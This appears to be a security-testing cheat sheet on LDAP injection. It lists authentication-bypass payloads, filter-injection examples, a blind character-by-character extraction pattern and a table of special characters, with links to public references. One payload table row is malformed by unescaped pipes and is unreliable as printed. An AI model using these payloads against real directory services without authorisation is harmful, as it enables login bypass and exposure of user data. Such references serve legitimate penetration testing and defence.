# LDAP Injection

LDAP injection occurs when user input is incorporated into LDAP queries without proper sanitization, allowing attackers to modify the query logic to bypass authentication, enumerate directory data, or access unauthorized information.

## Checks

- [ ] Identify inputs that interact with a directory service (login forms, user search, address books)
- [ ] Test for authentication bypass with wildcard or tautology payloads
- [ ] Test for information disclosure via crafted LDAP filters
- [ ] Check for blind LDAP injection using boolean-based or error-based techniques

## Authentication Bypass Payloads

```
*
*)(&
*)(|(&
admin)(|(&
admin)(&)
*)((|userPassword=*)
```

## Common LDAP Filter Injection

If the application builds an LDAP filter like `(&(uid=USER)(password=PASS))`:

| Goal                     | Username Payload | Resulting Filter                     |
| ------------------------ | ---------------- | ------------------------------------ | --------------- | ------------------------- |
| Bypass auth (known user) | `admin)(         | (&`                                  | `(&(uid=admin)( | (&&)(password=anything))` |
| Bypass auth (any user)   | `*`              | `(&(uid=*)(password=anything))`      |
| Enumerate users          | `admin*`         | `(&(uid=admin*)(password=anything))` |

## Boolean-Based Blind Extraction

Test character by character:

```
admin)(|(uid=a*
admin)(|(uid=b*
...
```

Check for differences in the response (e.g., login success vs. failure, response length).

## Special Characters

| Character | URL Encoded | Description      |
| --------- | ----------- | ---------------- |
| `*`       | `%2a`       | Wildcard         |
| `(`       | `%28`       | Open filter      |
| `)`       | `%29`       | Close filter     |
| `\`       | `%5c`       | Escape character |
| `&`       | `%26`       | AND operator     |
| `\|`      | `%7c`       | OR operator      |

---

## References

- [PayloadsAllTheThings - LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
- [HackTricks - LDAP Injection](https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html)
- [OWASP - LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
